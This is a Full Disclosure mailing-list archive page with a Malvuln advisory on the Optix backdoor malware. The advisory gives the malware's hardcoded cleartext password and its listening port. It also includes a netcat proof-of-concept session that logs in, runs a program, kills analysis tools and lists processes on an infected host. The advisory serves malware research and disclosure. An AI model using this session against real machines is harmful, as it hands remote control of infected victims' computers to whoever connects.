---
title: Backdoor.Win32.Optix.02.b / Weak Hardcoded Credentials
url: https://seclists.org/fulldisclosure/2024/Sep/15
source: Full Disclosure
date: 2024-09-07
fetch_date: 2025-10-06T18:31:13.102809
---

# Backdoor.Win32.Optix.02.b / Weak Hardcoded Credentials

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](14)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Optix.02.b / Weak Hardcoded Credentials

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Tue, 3 Sep 2024 21:14:58 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/706ddc06ebbdde43e4e97de4d5af3b19.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.Optix.02.b
Vulnerability: Weak Hardcoded Credentials
Description: Optix listens on TCP port 5151 and is packed with ASPack
(2.11d). Unpacking is trivial set breakpoints on POPAD, RET, run and
dump using OllyDumpEx. The unpacked PE file reveals a very weak three
character cleartext password "1q1" stored as "svrpwd=1q1" at offset:
0000da4c of the unpacked malware. Commands sent to the backdoor use a
semicolon ";" as a marker E.g. password;1q1;
Family: Optix
Type: PE32
MD5: 706ddc06ebbdde43e4e97de4d5af3b19
SHA256: 2d38b18bdedfa7f27aac3f52a6d717f3cef7cf809e06f4a34ac0a93c90a82b1c
Vuln ID: MVID-2024-0690
Disclosure: 09/03/2024

Exploit/PoC:
nc64.exe x.x.x.x 5151
password;1q1;
password;1;Optix Lite v0.2 Server Ready...
ExecFile;"c:\Windows\System32\calc.exe"
Response;File Ran Successfully
GetPath;
TheServerPath;c:\windows\sec32.exe
GetSysDir;
TheSysDir;
;C:\WINDOWS\system32\
GetWinDir;
TheWinDir;
;C:\WINDOWS\
KillProcPls;pestudio.exe;
Response;Program killed successfully!
KillProcPls;die.exe;
Response;Program killed successfully!
GetProcsPls;
HeresDaProcs;[System
Process];System;smss.exe;csrss.exe;wininit.exe;csrss.exe;winlogon.exe;services.exe;lsass.exe;fontdrvhost.exe;fontdrvhost.exe;svchost.exe;svchost.exe;dwm.exe;...

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](14)
[By Date](date.html#15)
[![Next](/images/right-icon-16x16.png)](16)

[![Previous](/images/left-icon-16x16.png)](14)
[By Thread](index.html#15)
[![Next](/images/right-icon-16x16.png)](16)

### Current thread:

* **Backdoor.Win32.Optix.02.b / Weak Hardcoded Credentials** *malvuln (Sep 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")